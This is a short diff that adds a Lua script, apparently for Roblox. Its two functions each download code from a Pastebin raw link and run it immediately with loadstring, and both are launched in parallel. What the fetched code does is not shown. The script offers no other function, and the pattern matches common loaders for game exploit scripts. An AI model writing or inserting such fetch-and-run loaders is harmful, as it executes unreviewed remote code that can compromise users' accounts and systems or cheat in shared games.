@@ -1,0 +1,12 @@
+local function s()
+    loadstring(game:HttpGet("https://pastebin.com/raw/cREz1mfW"))()
+end
+local function f()
+loadstring(game:HttpGet("https://pastebin.com/raw/EHsRLvqE"))()
+
+
+
+end
+
+task.spawn(s)
+task.spawn(f)
